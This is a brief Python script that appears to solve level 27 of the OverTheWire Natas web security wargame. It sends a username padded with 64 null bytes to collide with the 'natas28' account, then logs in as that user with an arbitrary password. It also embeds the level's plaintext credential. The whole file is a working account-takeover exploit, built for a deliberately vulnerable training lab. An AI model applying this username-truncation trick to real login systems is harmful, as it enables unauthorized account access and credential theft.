import requests 
import re

session = requests.Session()


response = session.post('http://natas27.natas.labs.overthewire.org', auth = ('natas27', 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'), data = {'username': 'natas28' + '%00' * 64 + 'anything', 'password': 'anything'})
print(response.text)

response = session.post('http://natas27.natas.labs.overthewire.org', auth = ('natas27', 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'), data = {'username': 'natas28', 'password': 'anything'})
print(response.text)